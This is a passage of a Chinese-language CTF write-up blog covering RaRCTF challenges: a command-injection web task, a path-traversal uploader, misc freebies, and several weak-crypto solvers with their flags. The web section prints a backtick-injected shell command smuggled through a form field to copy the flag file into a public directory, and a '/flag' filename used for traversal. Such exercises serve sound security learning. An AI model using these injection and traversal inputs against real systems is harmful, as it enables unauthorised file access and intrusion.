punctuation">.</span>invert<span class="token punctuation">(</span><span class="token number">0x10001</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span>        m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            p_q <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            factor <span class="token operator">=</span> FactorDB<span class="token punctuation">(</span>p_q<span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                ans <span class="token operator">=</span> factor<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>                factors <span class="token operator">=</span> ans<span class="token punctuation">[</span><span class="token string">'factors'</span><span class="token punctuation">]</span>                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>factors<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    p <span class="token operator">=</span> factors<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                    q <span class="token operator">=</span> factors<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                    <span class="token keyword">if</span> check<span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span>                        <span class="token keyword">return</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    solve<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""b'CCTF&#123;wH3Re_0Ur_Br41N_Iz_5uP3R_4CtIVe_bY_RSA!!&#125;'9324884768249686093 10512422984265378151"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Rima"><a href="#Rima" class="headerlink" title="Rima"></a>Rima</h3><pre class="line-numbers language-none"><code class="language-none">Sequences are known to be good solutions, but are they good problems?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="RaRCTF"><a href="#RaRCTF" class="headerlink" title="RaRCTF"></a>RaRCTF</h1><h2 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h2><p>比赛题目的质量很好，题量大，题型丰富，简单的简单，难的难，做起来简单的也比较有成就感hhh，只是比赛的时候做出来的题目不多，赛后想要复现的时候又晚了，那时web、pwn、部分crypto、部分misc都已经无法复现了，所以这里只复现了一丢丢。</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="lemonthinker-100-points"><a href="#lemonthinker-100-points" class="headerlink" title="lemonthinker (100 points)"></a>lemonthinker (100 points)</h3><pre class="line-numbers language-题目描述" data-language="题目描述"><code class="language-题目描述">generate your lemonthinks here!lemonthinkNote: All characters that look like a O are actually a 0, please  try replacing all O&#39;s with  0&#39;s if you find that your flag does not work.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题很简单啊，一个简单的命令执行的bypass</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">text <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>getlist<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>text <span class="token operator">=</span> text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>filename <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>chars<span class="token punctuation">,</span>k<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".png"</span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"python3 generate.py </span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename<span class="token punctuation">&#125;</span></span><span class="token string"> \"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>text<span class="token punctuation">&#125;</span></span><span class="token string">\""</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>后面的system函数是关键，这里可以直接使用反引号进行命令执行，将读到的flag输出到可访问的目录之中即可</p><pre class="line-numbers language-none"><code class="language-none">&#96;cat ..&#x2F;flag.txt &gt; .&#x2F;static&#x2F;images&#x2F;flag.txt&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再访问</p><pre class="line-numbers language-url" data-language="url"><code class="language-url">http:&#x2F;&#x2F;193.57.159.27:36679&#x2F;static&#x2F;images&#x2F;flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可得到flag</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">rarctf&#123;b451c-c0mm4nd_1nj3ct10n_f0r-y0u_4nd_y0ur-l3m0nth1nk3rs_d8d21128bf&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Secure-Uploader-150-points"><a href="#Secure-Uploader-150-points" class="headerlink" title="Secure Uploader (150 points)"></a>Secure Uploader (150 points)</h3><pre class="line-numbers language-题目描述" data-language="题目描述"><code class="language-题目描述">A new secure, safe and smooth uploader!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> g<span class="token keyword">import</span> sqlite3<span class="token keyword">import</span> os<span class="token keyword">import</span> uuidapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>SCHEMA <span class="token operator">=</span> <span class="token triple-quoted-string string">"""CREATE TABLE files (id text primary key,path text);"""</span><span class="token keyword">def</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    g_db <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> <span class="token string">'_database'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> g_db <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        g_db <span class="token operator">=</span> g<span class="token punctuation">.</span>_database <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"database.db"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> g_db<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>before_first_request</span><span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"database.db"</span><span class="token punctuation">)</span>    cur <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>executescript<span class="token punctuation">(</span>SCHEMA<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&lt;!DOCTYPE html>&lt;html>&lt;body>&lt;form action="/upload" method="post" enctype="multipart/form-data">    Select image to upload:    &lt;input type="file" name="file">    &lt;input type="submit" value="Upload File" name="submit">&lt;/form>&lt;/body>&lt;/html>"""</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token string">"."</span> <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Bad filename!"</span><span class="token punctuation">,</span> <span class="token number">403</span>    conn <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span>    cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    uid <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"insert into files (id, path) values (?, ?)"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>uid<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> sqlite3<span class="token punctuation">.</span>IntegrityError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Duplicate file"</span>    conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># print('uploads/' + file.filename)</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'uploads/'</span> <span class="token operator">+</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/file/'</span> <span class="token operator">+</span> uid<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/file/&lt;id>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    conn <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span>    cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select path from files where id=?"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> cur<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> res <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"File not found"</span><span class="token punctuation">,</span> <span class="token number">404</span>    <span class="token comment"># print(res[0])</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"uploads/"</span><span class="token punctuation">,</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">return</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    考的是关于<code>os.path.join()</code>函数的知识点，<a href="https://blog.csdn.net/xrinosvip/article/details/84202547">关于该知识点</a>，其实就是他合并的时候会有这种，如果一个参数是以<code>/</code>这个符号开头的，就将这个参数作为开头继续向后拼接。故</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"uploads/"</span><span class="token punctuation">,</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这句话，参数<code>res[0]</code>可控，将它命名为<code>/flag</code>即可实现目录遍历从而也访问到<code>/flag</code>。</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210808204411277.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">rarctf&#123;4lw4y5_r34d_th3_d0c5_pr0p3rly!-71ed16&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Fancy-Button-Generator-100-points"><a href="#Fancy-Button-Generator-100-points" class="headerlink" title="Fancy Button Generator (100 points)"></a>Fancy Button Generator (100 points)</h3><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="discord-10-points"><a href="#discord-10-points" class="headerlink" title="discord (10 points)"></a>discord (10 points)</h3><p>这是个白嫖的flag</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210807170208608.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">rarctf&#123;wh3n_4r3_w3-m0v1ng_b4ck_t0-IRC?_29ff18a15e&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Coherence-Check-10-points"><a href="#Coherence-Check-10-points" class="headerlink" title="Coherence Check (10 points)"></a>Coherence Check (10 points)</h3><p>白送的flag</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210807170824680.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">rarctf&#123;Welcome_To_RaRCTF!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="minigen-100-points"><a href="#minigen-100-points" class="headerlink" title="minigen (100 points)"></a>minigen (100 points)</h3><pre class="line-numbers language-题目描述" data-language="题目描述"><code class="language-题目描述">A stream cipher in only 122 bytes!Note: This has been tested on python versions 3.8 and 3.9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>给出了一个脚本，一个输出，脚本是个简单的异或加密脚本+参数伪随机。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">'def f(x):'</span> <span class="token operator">+</span> <span class="token string">'yield((x:=-~x)*x+-~-x)%727;'</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span>g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> c<span class="token punctuation">:</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">next</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到<code>next(g)</code>这个参数是伪随机的，这里直接写个脚本碰撞一下即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">'def f(x):'</span> <span class="token operator">+</span> <span class="token string">'yield((x:=-~x)*x+-~-x)%727;'</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span>g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""print(*map(lambda c: ord(c) ^ next(g), list(open('f').read())))"""</span>flag <span class="token operator">=</span> <span class="token string">''</span>a <span class="token operator">=</span> <span class="token string">'281 547 54 380 392 98 158 440 724 218 406 672 193 457 694 208 455 745 196 450 724'</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#if ord('r') ^ next(g) == a[0]:   # next(g) == 363</span>    <span class="token keyword">if</span> <span class="token builtin">next</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">363</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">next</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token comment"># arctf&#123;pyg01f_1s_fun&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    <code>if ord(&#39;r&#39;) ^ next(g) == a[0]</code>这个判断条件会对结果造成一定程度的影响，所以这里改的直接了一点。</p><p>​    最后别忘了在结果前面加上<code>r</code>。</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">rarctf&#123;pyg01f_1s_fun&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="sRSA-100-points"><a href="#sRSA-100-points" class="headerlink" title="sRSA (100 points)"></a>sRSA (100 points)</h3><pre class="line-numbers language-题目描述" data-language="题目描述"><code class="language-题目描述">we have created the securest possible rsa algorithm!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这题说不上是rsa，他的算法为<code>(m * e) mod n</code>，rsa中<code>m</code>与<code>e</code>的关系应该是幂的关系，这里直接对商值进行爆破即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token triple-quoted-string string">"""p = getPrime(256)q = getPrime(256)n = p * qe = 0x69420flag = bytes_to_long(open("flag.txt", "rb").read())print("n =",n)print("e =", e)print("ct =",(flag * e) % n)"""</span>n <span class="token operator">=</span> <span class="token number">5496273377454199065242669248583423666922734652724977923256519661692097814683426757178129328854814879115976202924927868808744465886633837487140240744798219</span>e <span class="token operator">=</span> <span class="token number">431136</span>ct <span class="token operator">=</span> <span class="token number">3258949841055516264978851602001574678758659990591377418619956168981354029697501692633419406607677808798749678532871833190946495336912907920485168329153735</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">*</span> n <span class="token operator">+</span> ct<span class="token punctuation">)</span> <span class="token operator">//</span> e    <span class="token keyword">if</span> e <span class="token operator">*</span> flag <span class="token operator">==</span> <span class="token punctuation">(</span>i <span class="token operator">*</span> n <span class="token operator">+</span> ct<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'rarctf&#123;ST3GL0LS_ju5t_k1dd1ng_th1s_w4s_n0t_st3g_L0L!_83b7e829d9&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="unrandompad-150-points-未解出"><a href="#unrandompad-150-points-未解出" class="headerlink" title="unrandompad (150 points) 未解出"></a>unrandompad (150 points) 未解出</h3><pre class="line-numbers language-题目描述" data-language="题目描述"><code class="language-题目描述">Yeah I use randomized padding, it increases security!Note: This is a part 1 challenge of randompad. Take a look at the source for that one and compare the two for a hint on how to solve.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> random <span class="token keyword">import</span> getrandbits<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> long_to_bytes<span class="token punctuation">,</span> bytes_to_long<span class="token keyword">def</span> <span class="token function">keygen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># normal rsa key generation</span>    primes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    e <span class="token operator">=</span> <span class="token number">3</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        primes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    <span class="token keyword">return</span> e<span class="token punctuation">,</span> primes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> primes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">pad</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># pkcs#1 v1.5</span>    ms <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span>    ns <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ms<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ns<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">11</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>    padlength <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ns<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ms<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">3</span>    ps <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>getrandbits<span class="token punctuation">(</span>padlength <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>padlength<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span><span class="token string">b"\x00\x02"</span> <span class="token operator">+</span> ps <span class="token operator">+</span> <span class="token string">b"\x00"</span> <span class="token operator">+</span> ms<span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># standard rsa</span>    res <span class="token operator">=</span> pad<span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">if</span> res <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token 